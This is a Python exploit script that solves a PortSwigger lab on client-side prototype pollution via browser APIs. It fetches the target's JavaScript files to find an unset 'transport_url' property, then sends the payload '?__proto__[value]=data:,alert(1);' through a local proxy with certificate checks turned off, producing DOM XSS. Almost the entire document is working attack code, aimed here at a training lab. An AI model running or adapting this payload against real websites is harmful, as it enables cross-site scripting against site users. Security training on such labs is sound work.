# Client-side prototype pollution via browser APIs

# https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def find_js(s, url):
	print('\n[+] Trying to find javascript files loaded on the home page...')
	s.cookies.clear()
	s.headers.clear()
	r = s.get(url)
	js_files = re.findall(r"<script src='(.*)'></", r.text)
	for file_path in js_files:
		print('\n[+] Found javascript file path:\n%s' % file_path)
		js_content = s.get(url + file_path).text
		time.sleep(2)
		print('\n--------------------------------------------\n')
		print('%s' % js_content)
		print('\n--------------------------------------------')
		time.sleep(2)
		if 'config.transport_url' in js_content:
			print('[+] Found "transport_url" property with no defined value potentially reflected in the rendered page !')
			return file_path

def inject_prototype(s, url):
	print('\n[+] Trying to inject javascript prototype...')
	time.sleep(2)
	payload = '?__proto__[value]=data:,alert(1);'
	injection_path = url + payload
	print('[+] Navigating to %s' % injection_path)
	r = s.get(injection_path)
	print(r)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Client-side prototype pollution via browser APIs')
	parser = argparse.ArgumentParser(description="[+] Lab: Client-side prototype pollution via browser APIs")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("\n[+] Trying to send a find a javascript object to send a DOM XSS...")
			path = find_js(s, url)
			time.sleep(2)
			r = inject_prototype(s, url)
			s.cookies.clear()
			time.sleep(4)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)


if __name__ == "__main__":
	main()
